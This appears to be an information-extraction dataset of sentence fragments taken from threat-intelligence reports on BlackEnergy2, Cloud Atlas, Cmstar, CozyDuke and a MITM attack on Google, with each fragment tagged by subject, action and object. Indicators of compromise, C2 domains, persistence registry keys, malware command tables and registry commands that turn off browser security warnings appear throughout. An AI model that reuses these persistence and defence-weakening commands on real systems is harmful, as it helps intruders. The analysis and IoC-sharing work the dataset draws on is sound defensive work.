(i.e. target surveying, configuration updates, malware updates, and data exfiltration)"]}}], " As described in Dmitry's 2010 Black DDoS' analysis, a\nconfiguration file is downloaded from the server by main.dll on an infected system": [{"is downloaded": {"A": "is downloaded", "S": "main.dll", "O": ["from the server", "on an infected system", "a configuration file"]}}], " And, they revealed that their Cisco routers with different IOS versions were hacked": [{"were hacked": {"A": "were hacked", "O": ["their Cisco routers with different IOS versions"]}}], " They are consistent and serve as stable IoC:\n<list>\n\n%system32%\\drivers\\winntd_.dat\n%system32%\\drivers\\winntd.dat\n%system32%\\drivers\\wincache.dat\n%system32%\\drivers\\mlang.dat\n%system32%\\drivers\\osver32nt.dat\n%LOCALAPPDATA%\\adobe\\wind002.dat\n%LOCALAPPDATA%\\adobe\\settings.sol\n%LOCALAPPDATA%\\adobe\\winver.dat\n%LOCALAPPDATA%\\adobe\\cache.dat\n</list>\n": [{"uses": {"A": "uses", "S": "BE2", "O": ["start menu locations", "for persistence"]}}], "\n\n<heading>Victim #1</heading>\n\f\nThe BE2 attackers successfully spearphished an organization with an exploit for which there is no current\nCVE, and a metasploit module has been available This email message contained a ZIP archive with EXE\nfile inside that did not appear to be an executable": [{"spearphished": {"A": "spearphished", "S": "The BE2 attackers", "O": ["an organization"]}}], " The 'vsnet' plugin was intended to spread and launch a\npayload (BlackEnergy2 dropper itself at the moment) in the local network by using PsExec, as well as\ngaining primary information on the user's computer and network": [{"spread and launch": {"A": "spread and launch", "S": "The 'vsnet' plugin", "O": ["a payload (BlackEnergy2 dropper itself at the moment) in the local network", "using PsExec"]}, "gaining": {"A": "gaining", "S": "The 'vsnet' plugin", "O": ["primary information on the user's computer and network"]}}], " The config files within BE2 contained the settings\nof the company's internal web proxy:\n\f\n\n<figure></figure>\n\n<caption>BE2 config file contains victim's internal proxy</caption>\n\nAs the APT-specific BE2 now stores the downloaded plugins in encrypted files on the system (not seen in\nolder versions \u2013 all plugins were only in-memory), the administrators were able to collect BE2 files from\nthe infected machines": [{"stores": {"A": "stores", "S": "BE2", "O": ["the downloaded plugins"]}}], "\nBlackEnergy2 was eventually seen downloading more crimeware plugins - a custom spam plugin and a\nbanking information stealer custom plugin": [{"downloading": {"A": "downloading", "S": "BlackEnergy2", "O": ["more crimeware plugins - a custom spam plugin and a banking information stealer custom plugin"]}}], " Initially, cybercriminals used BlackEnergy custom\nplugins for launching DDoS attacks": [{"launching": {"A": "launching", "S": "BlackEnergy custom plugins", "O": ["DDoS attacks"]}}], "\n</section>\n\f\n<section>\n<heading>Appendix: IoC</heading>\n\nWhile BE dropper installs": [{"installs": {"A": "installs", "S": "BE dropper", "O": ["its driver"]}}], " By all appearances, the attackers pushed the 'dstr' module when they\nunderstood that they were revealed, and wanted to hide their presence on the machines": [{"pushed": {"A": "pushed", "S": "the attackers", "O": ["the 'dstr' module"]}}], " While another crimeware group continues to use BlackEnergy to launch DDoS\nattacks, the BE2 APT appears to have used this tool exclusively throughout 2014 at victim sites and\nincluded custom plugins and scripts of their own": [{"launch": {"A": "launch", "S": "another crimeware group", "O": ["DDoS attacks"]}}], " Though unusual, the ARM module was delivered by the same server and\nit processed the same config file": [{"delivered": {"A": "delivered", "S": "the same server", "O": ["the ARM module"]}}], "\n\nThe comment includes a punchy message for \"kasperRsky\":\n\f\n\n<figure></figure>\n\n<caption>BE2 ciscoapi.tcl fragment</caption>\n\nKillint.tcl \u2013 uses Ciscoapi.tcl, implements destroying functions:\n\f\n\n<figure></figure>\n\n<caption>BE2 killint.tcl fragment</caption>\n\nThe script tries to download ciscoapi.tcl from a certain FTP server which served as a storage for BE2 files": [{"download": {"A": "download", "S": "The script", "O": ["from a certain FTP server", "ciscoapi.tcl"]}}], " Why would the attackers need\ninformation on usb and bios characteristics? It suggests that based on a specific USB and BIOS devices,\nthe attackers may upload specific plugins to carry out additional actions": [{"upload": {"A": "upload", "S": "the attackers", "O": ["specific plugins"]}}], " Starting in March 2014 and ending in July 2014, Siemens\n\"ccprojectmgr.exe\" downloaded and executed a handful of different payloads hosted\nat 94.185.85.122/favicon.ico": [{"downloaded": {"A": "downloaded", "S": "Siemens \"ccprojectmgr.exe\"", "O": ["a handful of different payloads"]}}], " The server definitely delivered config files not only for Windows, but\nalso for the ARM/MIPS platform": [{"delivered": {"A": "delivered", "S": "The server", "O": ["config files"]}}], " Our observation of related actions here:\n<table>\n u ps                              start password stealing (Windows)\n Ps_mps/ps_hwi start               start password stealing (Linux, MIPS, ARM)\n                                   rewrite hook module with a new version and launch it\n uper_mps/uper_hwi start\n                                   (Linux, MIPS, ARM)\n Nm_mps/nm_hwi start \u2013             Scan ports and retrieve banners on the router subnet\n ban -middle                       (Linux, MIPS, ARM)\n U fsget * 7 *.docx, *.pdf,\n                                   search for docs with the given filetypes (Windows)\n *.doc *\n                                   retrieve information on installed programs and launch\n S sinfo                           commands: systeminfo, tasklist, ipconfig, netstat, route\n                                   table, trace route to google.com (Windows)\n weap_mps/weap_hwi\n host188.128.123.52\n                                   DDoS on 188.128.123.52 (Linux, MIPS, ARM)\n port[25,26,110,465,995]\n typetcpconnect\n weap_mps/weap_hwi\n typesynflood port80\n                                   DDoS on 212.175.109.10 (Linux, MIPS, ARM)\n cnt100000 spdmedium\n host212.175.109.10\n</table>\nThe issued commands for the Linux plugins suggest the attackers controlled infected MIPS/ARM\ndevices": [{"controlled": {"A": "controlled", "S": "the attackers", "O": ["infected MIPS/ARM devices"]}}], "\n\f\n\n<figure></figure>\n\n<caption>Hook module structure</caption>\n\nAfter decrypting the strings, it became clear that the Linux Hook main module communicated with the\nsame CnC server as other Windows modules:\n\n\n<figure></figure>\n\n<caption>The CNC's IP address in the Linux module</caption>\n\f\nThis Linux module can process the following commands, some of which are similar to the Windows\nversion:\n<table>\n die                delete all BlackEnergy2 files and system traces\n kill               delete all BlackEnergy2 files and system traces and reboot\n lexec              launch a command using bin/sh\n rexec              download and launch file using 'fork/exec'\n update             rewrite self file\n migrate            update the CnC server\n</table>\n</section>\n\n<section>\n<heading>Windows Plugins</heading>\n\nAfter the disclosure of an unusual CnC server that pushed Linux and the new Windows plugins we paid\ngreater attention to new BE2 samples and associated CnCs": [{"communicated": {"A": "communicated", "S": "Linux Hook main module", "O": ["with the same CnC server"]}}], "\n\nThe malware connects back to the exploit domain pic.nicklockluckydog[.]org as well as the subdomain\nssl.nicklockluckydog[.]org": [{"connects back": {"A": "connects back", "S": "The malware", "O": ["to the exploit domain pic.nicklockluckydog[.]org", "to the subdomain ssl.nicklockluckydog[.]org"]}}], " In turn, The malicious DLL\nloads a backdoor binary blob MD5: 16E5A27BD55E0B4E595C9743F4C75611 (ticrf.rat)": [{"loads": {"A": "loads", "S": "The malicious DLL", "O": ["a backdoor binary blob MD5"]}}], " LMS.exe will load any DLL file name\ndbghelp.dll that is found in the same path, hence the sideloading technique": [{"load": {"A": "load", "S": "LMS.exe", "O": ["any DLL file name dbghelp.dll that is found in the same path"]}}], " The evidence we've observed instead indicate that the MITM attack is performed either by\nperforming IP hijacking or by simply reconfiguring a router to forward the HTTPS traffic to a transparent\nSSL proxy": [{"reconfiguring": {"A": "reconfiguring", "O": ["a router", "to forward the HTTPS traffic to a transparent SSL proxy"]}}, {"performing": {"A": "performing", "O": ["IP hijacking"]}}], " A\nreasonable assumption is therefore that the MITM is carried out on the 2001:252::/32 network, or where\nAS23910 (2001:da8:1::2) connects to AS23911 (2001:252:0:1::1)": [{"is carried out": {"A": "is carried out", "O": ["on the 2001:252::/32 network", "the MITM"]}}], "<doc>\n<section>\n<heading>Analysis of Chinese MITM on Google</heading>\nThursday, 04 September 2014 23:55:00 (UTC/GMT)\n\nThe Chinese are running a MITM attack on SSL encrypted traffic between Chinese universities and\nGoogle": [{"running": {"A": "running", "S": "The Chinese", "O": ["a MITM attack"]}}], " Again, this is a clear indication of an IP MITM taking place,\nsince Google cannot possibly send a response from the US to CERNET within 8ms regardless of how fast\nthey are": [{"taking place": {"A": "taking place", "S": "IP MITM"}}], "\n</section>\n\n<section>\n<heading>Conclusions</heading>\n\nAll evidence indicates that a MITM attack is being conducted against traffic between China\u2019s nationwide\neducation and research network CERNET and www.google.com": [{"is being conducted": {"A": "is being conducted", "O": ["a MITM attack", "against traffic between China\u2019s nationwide education and research network CERNET and www.google.com"]}}], "\n\nWe previously observed only one other group using a similar method \u2013 ItaDuke \u2013 that connected to\naccounts on the cloud provider mydrive.ch": [{"connected": {"A": "connected", "S": "only one other group", "O": ["to accounts on the cloud provider mydrive.ch"]}}], " In\nturn, the malware uploads the replies back to the server via the same mechanism": [{"uploads": {"A": "uploads", "S": "the malware", "O": ["the replies", "via the same mechanism", "back to the server"]}}], "\n</section>\n\n<section>\n<heading>C&C communication</heading>\n\nThe Cloud Atlas implants utilize a rather unusual C&C mechanism": [{"utilize": {"A": "utilize", "S": "The Cloud Atlas implants", "O": ["a rather unusual C&C mechanism"]}}], "\n\nInterestingly, some of the spear-phishing documents between Cloud Atlas and RedOctober seem to exploit\nthe same theme and were used to target the same entity at different times": [{"exploit": {"A": "exploit", "S": "some of the spear-phishing documents between Cloud Atlas and RedOctober", "O": ["the same theme"]}, "target": {"A": "target", "S": "some of the spear-phishing documents between Cloud Atlas and RedOctober", "O": ["at different times", "the same entity"]}}], " The payload is always\nencrypted with a unique key, making it impossible to decrypt unless the DLL is available": [{"is always encrypted": {"A": "is always encrypted", "O": ["with a unique key", "The payload"]}}], "\n\nSome of the filenames used in the attacks included:\n<list>\n       FT - Ukraine Russia's new art of war.doc\n       \u041a\u0430\u0442\u0430\u0441\u0442\u0440\u043e\u0444\u0430 \u043c\u0430\u043b\u0430\u0439\u0437\u0438\u0439\u0441\u043a\u043e\u0433\u043e \u043b\u0430\u0439\u043d\u0435\u0440\u0430.doc\n       Diplomatic Car for Sale.doc\n       \u041c\u0412\u041a\u0421\u0418.doc\n       Organigrama Gobierno Rusia.doc\n       \u0424\u043e\u0442\u043e.doc\n       \u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0435 \u043f\u0438\u0441\u044c\u043c\u043e.doc\n       \u0424\u043e\u0440\u043c\u0430 \u0437\u0430\u044f\u0432\u043a\u0438 (25-26.09.14).doc\n       \u0418\u043d\u0444\u043e\u0440\u043c\u0430\u0446\u0438\u043e\u043d\u043d\u043e\u0435 \u043f\u0438\u0441\u044c\u043c\u043e.doc\n\f\n      \u041f\u0438\u0441\u044c\u043c\u043e_\u0420\u0443\u043a\u043e\u0432\u043e\u0434\u0438\u0442\u0435\u043b\u044f\u043c.doc\n      \u041f\u0440\u0438\u043b\u043e\u0436.doc\n      Car for sale.doc\n      Af-Pak and Central Asia's security issues.doc\n</list>\nAt least one of them immediately reminded us of RedOctober, which used a very similarly named\nspearphish: \"Diplomatic Car for Sale.doc\"": [{"used": {"A": "used", "S": "RedOctober", "O": ["a very similarly named spearphish: \"Diplomatic Car for Sale.doc\""]}}], "\n\nHere's a look at one such account from CloudMe:\n\n<figure></figure>\n\n\nThe data from the account:\n\f\n\n<figure></figure>\n\nThe files stored in the randomly named folder were uploaded by the malware and contain various things,\nsuch as system information, running processes and current username": [{"contain": {"A": "contain", "S": "The files stored in the randomly named folder", "O": ["various things, such as system information, running processes and current username"]}}, {"were uploaded": {"A": "were uploaded", "S": "the malware", "O": ["The files stored in the randomly named folder"]}}], " All the malware samples we've seen\ncommunicate via HTTPS and WebDav with the same server \"cloudme.com\", a cloud services provider": [{"communicate": {"A": "communicate", "S": "All the malware samples we've seen", "O": ["via HTTPS and WebDav", "with the same server \"cloudme.com\", a cloud services provider"]}}], " The data is compressed with LZMA\nand encrypted with AES, however, the keys are stored in the malware body which makes it possible to\ndecrypt the information from the C&C": [{"is compressed": {"A": "is compressed", "O": ["with LZMA", "The data"]}, "encrypted": {"A": "encrypted", "O": ["with AES", "The data"]}}], " Instead, it writes an encrypted Visual Basic Script and runs it": [{"writes": {"A": "writes", "S": "it", "O": ["an encrypted Visual Basic Script"]}, "runs": {"A": "runs", "S": "it", "O": ["it"]}}], " For\ninstance, the \"qPd0aKJu.vbs\" file MD5:\n\f\nE211C2BAD9A83A6A4247EC3959E2A730 drops the following files:\n<list>\nDECF56296C50BD3AE10A49747573A346 - bicorporate - encrypted payload\nD171DB37EF28F42740644F4028BCF727 - ctfmonrn.dll - loader\n</list>\nThe VBS also adds a registry key:\n\nHKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\ setting the\nkey \"bookstore\" to the value \"regsvr32 %path%\\ctfmonrn.dll /s\", which ensures the malware runs every\ntime at system boot": [{"adds": {"A": "adds", "S": "The VBS", "O": ["a registry key: HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\"]}, "setting": {"A": "setting", "S": "The VBS", "O": ["the key \"bookstore\"", "to the value \"regsvr32 %path%\\ctfmonrn.dll /s\""]}, "ensures": {"A": "ensures", "S": "The VBS"}}, {"drops": {"A": "drops", "S": "E211C2BAD9A83A6A4247EC3959E2A730", "O": ["the following files"]}}], " Most Chinese-speaking attackers simply relocate C&C servers to a different place,\nrecompile the malware and carry on as if nothing happened": [{"relocate": {"A": "relocate", "S": "Most Chinese-speaking attackers", "O": ["to a different place", "C&C servers"]}}], "\n\nSome of the DLL names we observed include:\n<list>\nf4e15c1c2c95c651423dbb4cbe6c8fd5 - bicorporate.dll\n649ff144aea6796679f8f9a1e9f51479 - fundamentive.dll\n40e70f7f5d9cb1a669f8d8f306113485 - papersaving.dll\n58db8f33a9cdd321d9525d1e68c06456 - previliges.dll\nf5476728deb53fe2fa98e6a33577a9da - steinheimman.dll\n</list>\nSome of the payload names include:\n<list>\nsteinheimman\npapersaving\npreviliges\nfundamentive\nbicorporate\nmiditiming\ndamnatorily\nmunnopsis\narzner\nredtailed\nroodgoose\nacholias\nsalefians\nwartworts\nfrequencyuse\nnonmagyar\nshebir\ngetgoing\n</list>\n\f\nThe payload includes an encrypted configuration block which contains information about the C&C sever:\n\n<figure></figure>\n\n\nThe information from the config includes a WebDAV URL which is used for connections, a username and\npassword, two folders on the WebDAV server used to store plugins/modules for the malware and where\ndata from the victim should be uploaded": [{"is used": {"A": "is used", "O": ["a WebDAV URL", "for connections"]}}, {"contains": {"A": "contains", "S": "an encrypted configuration block", "O": ["information about the C&C sever"]}}, {"be uploaded": {"A": "be uploaded", "O": ["data from the victim"]}}], "\n\n<figure></figure>\n\n\nEach malware set we have observed so far communicates with a different CloudMe account though": [{"communicates": {"A": "communicates", "S": "Each malware set we have observed so far", "O": ["with a different CloudMe account"]}}], " The\nattackers upload data to the account, which is downloaded by the implant, decrypted and interpreted": [{"is downloaded": {"A": "is downloaded", "S": "the implant", "O": ["data"]}}], "\n\nWe observed several different spear-phishing documents that drop uniquely named payloads": [{"drop": {"A": "drop", "S": "several different spear-phishing documents", "O": ["uniquely named payloads"]}}], " Based on observations from KSN, some\nof the victims of RedOctober are also being targeted by CloudAtlas": [{"being targeted": {"A": "being targeted", "S": "CloudAtlas", "O": ["some of the victims of RedOctober"]}}], "\n\n\n<figure></figure>\n\n                              <caption>Cloud Atlas exploit payload - VBScript</caption>\n\nThis VBScript drops a pair of files on disk - a loader and an encrypted payload": [{"drops": {"A": "drops", "S": "This VBScript", "O": ["a pair of files", "on disk"]}}], "\n</section>\n\n<section>\n<heading> Conclusion </heading>\n\nThe Cmstar tool has several interesting features, including a previously unseen method of manually\ncreating its import address table using an API function name character to offset mapping techniques, and\na hashing algorithm used to find antivirus processes on an infected system": [{"used": {"A": "used", "S": "The Cmstar tool", "O": ["a hashing algorithm", "on an infected system", "to find antivirus processes"]}, "manually creating": {"A": "manually creating", "S": "The Cmstar tool", "O": ["using an API function name character", "to offset mapping techniques", "its import address table"]}}], "\n</section>\n\n<section>\n<heading> Hashing Process Names </heading>\n\nAs mentioned in the behavioral analysis section, the Cmstar downloader gathers system-specific\ninformation to send to the C2 server": [{"gathers": {"A": "gathers", "S": "the Cmstar downloader", "O": ["to send to the C2 server", "system-specific information"]}}], " Cmwhite Tools Using \u201ccgl-bin\u201d within HTTP Requests </caption>\n\nCmstar\u2019s HTTP POST requests sent to \u2018happy.launchtrue[.]com\u2019 contain data that the Trojan gathers from\nthe infected machine that has the following structure:\n\n<Windows Version number>@@<CPU Architecture (2 for x64, 1 for x86)>??<boolean for elevated\nprivileges>]]**<boolean if antivirus processes are found>!!<static version string>==\n\nIn one example, Unit 42 observed the following data within an analysis environment, which was then\nencrypted using a single-byte XOR algorithm and a key of 0x45 before being sent to the C2 server:\n\f510@@1??1]]**0!!150316o==\n\nHelpfully, the malware author writes log messages to the \u2018DF64159.TMP\u2019 file, used for debugging purposes\nthroughout the execution of the Cmstar downloader": [{"writes": {"A": "writes", "S": "the malware author", "O": ["log messages", "to the \u2018DF64159.TMP\u2019 file"]}}, {"gathers": {"A": "gathers", "S": "the Trojan", "O": ["from the infected machine", "data"]}}], " The encrypted strings within the Trojan include fields used within the\nHTTP requests that Cmstar will create to communicate with its C2 server, as well as additional strings\nused to interact with the registry": [{"create": {"A": "create", "S": "Cmstar", "O": ["to communicate with its C2 server", "HTTP requests"]}}], " Instead of finding API function names based on their\nhashed values, this malware enumerates libraries\u2019 export address table (EAT) and searches for the name\nof the API function the payload needs to load by using a character to offset array": [{"enumerates": {"A": "enumerates", "S": "this malware", "O": ["libraries\u2019 export address table (EAT)"]}}], "<doc>\n<section>\n<heading> Cmstar Downloader: Lurid and Enfal\u2019s New Cousin </heading>\nIn recent weeks, Unit 42 has been analyzing delivery documents used in spear-phishing attacks that drop\na custom downloader used in cyber espionage attacks": [{"drop": {"A": "drop", "S": "spear-phishing attacks", "O": ["a custom downloader"]}}], " However, the code does not decrypt, reference, or use the following registry key in any way, which\nsuggests that the malware author left this artifact in the code after swapping to the run key listed above:\n\n      HKCU\\Software\\Microsoft\\CTF\\LangBarAddIn\n\fCmstar also decrypts a 752-byte piece of shellcode that carries out communications with the C2 server,\nspecifically by sending HTTP POST requests to the following URL:\n\n      http://happy.launchtrue[.]com:8080/cgl-bin/update.cgi\n\nIt should be noted that the C2 URL contains the string \u2018cgl-bin\u2019, which visually resembles the common cgi-\nbin folder used by many webservers to run server-side scripts": [{"carries out": {"A": "carries out", "S": "a 752-byte piece of shellcode", "O": ["with the C2 server", "communications"]}, "sending": {"A": "sending", "S": "a 752-byte piece of shellcode", "O": ["to the following URL", "HTTP POST requests"]}}], " The embedded configuration contains nothing more than a URL that Cmstar uses as its\ncommand and control (C2) location": [{"uses": {"A": "uses", "S": "that Cmstar", "O": ["a URL", "as its command and control (C2) location"]}}], " Unit 42\nreverse engineered the algorithm and created the function seen below to generate hashes in order to\ndetermine the processes Cmstar is trying to find:\n\n<code>\ndef hashStr(st):\n\n     hash = 0\n\n 1\n\n 2\n\n 3\n\n 4\n\n 5\n\n 6\n\n 7      def hashStr(st):\n\n 8        hash = 0\n\n 9        count = 0\n\n 10       while count < len(st):\n\n 11         h1 = (hash<<0x13)&0xFFFFFFFF\n\n 12         h2 = (hash>>0x0d)&0xFFFFFFFF\n\f 13          h3 = (h1|h2)&0xFFFFFFFF\n\n 14          hash = (h3 + (ord(st[count])^0x4a))&0xFFFFFFFF\n\n 15          count += 1\n\n 16        return hash\n\n 17\n\n 18\n\n 19\n\n 20\n\n 21\n</code>\n\n\nUnit 42 found that the string \u2018avp\u2019 subjected to the algorithm above results in the value 0x1E00AFA, which\nsuggests the Cmstar sample specifically looks for Kaspersky\u2019s Anti-virus product (avp.exe) running on the\ncompromised system": [{"looks for": {"A": "looks for", "S": "the Cmstar sample", "O": ["Kaspersky\u2019s Anti-virus product (avp.exe) running on the compromised system"]}}], " The Cmstar sample associated with the MNKIT delivery document\ncreates the following registry key to automatically execute at system startup:\n\n      HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\xpsfiltsvcs: \u201crundll32.exe\n      C:\\DOCUME~1\\ADMINI~1\\LOCALS~1\\Temp\\xpsfiltsvcs.dll,XpsRegisterServer\u201d\n\nUnit 42 found an additional encrypted registry key that would allow Cmstar to automatically start up after\nreboots": [{"creates": {"A": "creates", "S": "The Cmstar sample associated with the MNKIT delivery document", "O": ["the following registry key", "to automatically execute at system startup"]}}], " Once again, it creates several registry entries with the help of the command line tool and\ncreates an instance of the Internet Explorer (CoCreateInstance() -> d30c1661-cdaf-11d0-8a3e-\n00c04fc9e26e) for contacting the C&C server": [{"creates": {"A": "creates", "S": "it", "O": ["an instance of the Internet Explorer"]}, "contacting": {"A": "contacting", "S": "it", "O": ["the C&C server"]}}], " As a result, we get the following\nnetwork information:\n\n<list>\nC&C server: defense.miraclecz.com (IP: 208.115.124.83)\nHTTP GET request: /index.asp?id=50100\n</list>\n\nAlso, we see that it downloads some kind of data (Base64 encoded)": [{"downloads": {"A": "downloads", "S": "it", "O": ["some kind of data"]}}], " It also tries to retrieve possible AntiVirus information by\nusing the COM interface (dc12a687-737f-11cf-884d-00aa004b2e24 -> IWbemLocator -> SELECT *\nFROM AntiVirusProduct)": [{"retrieve": {"A": "retrieve", "S": "It", "O": ["possible AntiVirus information", "by using the COM interface"]}}], " The important strings are as follows:\n\n<code>\n\nSELECT * FROM AntiVirusProduct\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v PrivDiscUiShown /t\nREG_DWORD /d 1 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v DEPOff /t REG_DWORD /d 1 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v DisableFirstRunCustomize /t\nREG_DWORD /d 2 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\" /v Check_Associations /t REG_SZ /d no\n/f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\Main\"\n\f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter\" /v ShownVerifyBalloon /t\nREG_DWORD /d 3 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter\" /v Enabled /t REG_DWORD /d\n1 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Explorer\\PhishingFilter\"\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v\nWarnOnPostRedirect /t REG_DWORD /d 0 /f\nreg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Internet Settings\" /v\nWarnonZoneCrossing /t REG_DWORD /d 0 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Connection Wizard\" /v AutoRecover /t REG_DWORD /d\n2 /f\nreg add \"HKCU\\Software\\Microsoft\\Internet Connection Wizard\" /v Completed /t REG_BINARY /d 1\n/f\n\\cmd.exe\n\n</code>\n\nTogether with the output of IDA Pro, we can see that this malware uses the command line tool cmd.exe for\nadding several registry keys to Internet Explorer": [{"adding": {"A": "adding", "S": "this malware", "O": ["several registry keys", "to Internet Explorer"]}}], " Furthermore, it makes use of the COM to launch an instance of Internet\nExplorer (d30c1661-cdaf-11d0-8a3e-00c04fc9e26e -> IWebBrowser2), supposedly to contact its C&C\nserver": [{"launch": {"A": "launch", "S": "it", "O": ["an instance of Internet Explorer"]}, "contact": {"A": "contact", "S": "it", "O": ["its C&C server"]}}], " The\ndynamic analysis showed the malware sample contacted the C&C server, but wasn't sending any URL\nparameters (id1, id2)": [{"contacted": {"A": "contacted", "S": "the malware sample", "O": ["the C&C server"]}}], " This time, the network information is as follows:\n\n<list>\nC&C server: buy.miraclecz.com (IP: 74.121.191.33)\nURL parameters (from strings of executable):\n%s/?id1=blank%d&id2=%d%d\n%s/?id1=%d%d\n</list>\n\nFrom the code we can see, that the sample has also the ability to encode/decode data from/to Base64": [{"encode": {"A": "encode", "S": "the sample", "O": ["from Base64", "data"]}}], " Finally, the\n dropper will use the copy of rundll32.exe to load and\n execute the CozyDuke main component": [{"use": {"A": "use", "S": "the dropper", "O": ["to load and execute the CozyDuke main component", "the copy of rundll32.exe"]}}], "                \n                                                              \n\n                                                              \n   <caption> FIGURE 2: THE COZYDUKE INFECTION FLOW </caption>                    \n              <figure>                                                \n                         ZIP file                             \n                                                              \n                                          Malicious link      \n               Downloads                                      \n                                                              \n                                                              \n                         ZIP file\n                                                              \n                                                              \n                   Extracts                                   \n                                                              \n                    Self-extracting                           \n                          RAR                                 \n                                                              \n\n                                                              \n            Extracts                  Extracts                \n                                                              \n                                                              \n                                                              \n                                                              \n                                                              \n    CozyDuke main dropper             Decoy document\n\n\n\n\n      Encrypted     CozyDuke\n     configuration components\n          file\n</figure>\n\n <heading> COZYDUKE MAIN DROPPER </heading>\n The main CozyDuke dropper, used for infecting hosts\n with CozyDuke, begins by checking whether the victim\n has an anti-virus product installed": [{"checking": {"A": "checking", "S": "The main CozyDuke dropper", "O": ["whether the victim has an anti-virus product installed"]}}], " Secondly, we also have reason to\n believe CozyDuke has, in some instances, downloaded\n and executed droppers for DLL files reminiscent of\n OnionDuke": [{"executed": {"A": "executed", "S": "CozyDuke"}, "downloaded": {"A": "downloaded", "S": "CozyDuke"}}], " The main component is executed by         \nthe CozyDuke dropper using a copy of rundll32.exe": [{"executed": {"A": "executed", "S": "the CozyDuke dropper", "O": ["The main component", "using a copy of rundll32.exe"]}}], "           \nThe CozyDuke toolset also includes multiple kinds                \nof droppers for infecting hosts with CozyDuke or for             \nexecuting additional tools from the CozyDuke toolset": [{"executing": {"A": "executing", "S": "multiple kinds of droppers", "O": ["additional tools", "from the CozyDuke toolset"]}, "infecting": {"A": "infecting", "S": "multiple kinds of droppers", "O": ["hosts", "with CozyDuke"]}}], "\n These tasks usually involve the execution of modules or\n executables providing additional functionality": [{"involve": {"A": "involve", "S": "These tasks", "O": ["the execution of modules or executables providing additional functionality"]}}], "\n    The CozyDuke toolset, which we believe has been\n    under active development since at least 2011,\n    consists of tools for infecting targeted hosts,\n    establishing and maintaining backdoor access to the\n    hosts, gathering information from them and gaining\n    further access to other hosts inside the victim\n    organization": [{"establishing and maintaining": {"A": "establishing and maintaining", "S": "The CozyDuke toolset", "O": ["to the hosts", "backdoor access"]}, "infecting": {"A": "infecting", "S": "The CozyDuke toolset", "O": ["targeted hosts"]}, "gathering": {"A": "gathering", "S": "The CozyDuke toolset", "O": ["information", "from them"]}, "gaining": {"A": "gaining", "S": "The CozyDuke toolset", "O": ["further access", "to other hosts inside the victim organization"]}}], " The dropper\n will additionally copy the system file rundll32.exe to the\n install location for CozyDuke": [{"copy": {"A": "copy", "S": "The dropper", "O": ["to the install location for CozyDuke", "the system file rundll32.exe"]}}], " The second category consists   \nof PE executable files that CozyDuke will write to disk  \nand execute on the infected host": [{"write": {"A": "write", "S": "CozyDuke", "O": ["to disk"]}, "execute": {"A": "execute", "S": "CozyDuke", "O": ["on the infected host"]}}], "\n Newer versions of the dropper will perform additional\n checks to ensure the dropper is not being executed inside\n a virtual machine or a known malware analysis sandbox\n environment": [{"ensure": {"A": "ensure", "S": "Newer versions of the dropper", "O": ["inside a known malware analysis sandbox", "the dropper is not being executed"]}}], "\n  CozyDuke may also register itself as a Windows service\n  or scheduled task": [{"register": {"A": "register", "S": "CozyDuke", "O": ["as scheduled task"]}}], " Upon execution, it will write two files to disk": [{"write": {"A": "write", "S": "it", "O": ["two files", "to disk"]}}], "\n For the purpose of managing tasks, the main component\n of CozyDuke implements 6 commands that the C&C\n server can specify": [{"implements": {"A": "implements", "S": "the main component of CozyDuke", "O": ["6 commands that the C&C server can specify"]}}], "\n                                                                       \n  <heading> Command and control communication </heading>                                   \n  CozyDuke\u2019s main method of communicating with its                     \n  command and control server is using either HTTP or                   \n  HTTPS": [{"communicating": {"A": "communicating", "S": "CozyDuke", "O": ["with its command and control server", "using either HTTP or HTTPS"]}}], " CozyDuke will modify the\n  registry entries in such a way that any loading of the\n  SharedTaskScheduler COM object will first load a special\n  CozyDuke module that will ensure CozyDuke stays active\n  on the victim host": [{"modify": {"A": "modify", "S": "CozyDuke", "O": ["the registry entries", "that will ensure CozyDuke stays active on the victim host"]}}], "            \nFinally, the CozyDuke toolset includes tools and scripts \u2013       \nsome custom-written, others based on openly available            \ntools \u2013 that are used for purposes such as gathering\nfurther information from infected hosts or for infecting         \nadditional hosts in the same target organization": [{"infecting": {"A": "infecting", "S": "the CozyDuke toolset", "O": ["additional hosts in the same target organization"]}, "gathering": {"A": "gathering", "S": "the CozyDuke toolset", "O": ["further information", "from infected hosts"]}}], "\n                                                                 \n                                                                 \n<heading> ATTACK OVERVIEW </heading>                                                 \n                                                                 \n<heading> Infection vector </heading>                                                 \nWe have observed CozyDuke being spread via email,                \nwhich usually contain a link to a compromised website            \nhosting a ZIP file (although in at least one case, the file was  \nhosted on Dropbox)": [{"spread": {"A": "spread", "S": "CozyDuke", "O": ["via email"]}}], "                                      \n                                                            \nThe most important functionalities offered by the main      \ncomponent are establishment of persistence, gathering       \nof basic system information, communication with the C&C     \nserver and the execution of additional tasks, modules or    \nexecutables as commanded by the C&C server": [{"are": {"A": "are", "S": "The most important functionalities", "O": ["establishment of persistence"]}}], " These files contain an executable            \nthat, upon execution, will write to disk and execute             \nCozyDuke, while at the same time presenting the user             \nwith a decoy to divert attention": [{"execute": {"A": "execute", "S": "an executable", "O": ["CozyDuke"]}, "write": {"A": "write", "S": "an executable", "O": ["to disk"]}}], "\n The dropper will then proceed to write the CozyDuke\n components to the specified location": [{"write": {"A": "write", "S": "The dropper", "O": ["the CozyDuke components", "to the specified location"]}}], " Firstly,\nCozyDuke may set itself to be executed at system startup    \nby adding a registry value under any of the following       \nregistry keys:                                              \n<list>\n    \u2022\t HKLM\\Software\\Microsoft\\Windows\\                     \n       CurrentVersion\\Run\\                                  \n    \u2022\t HKCU\\Software\\Microsoft\\Windows\\      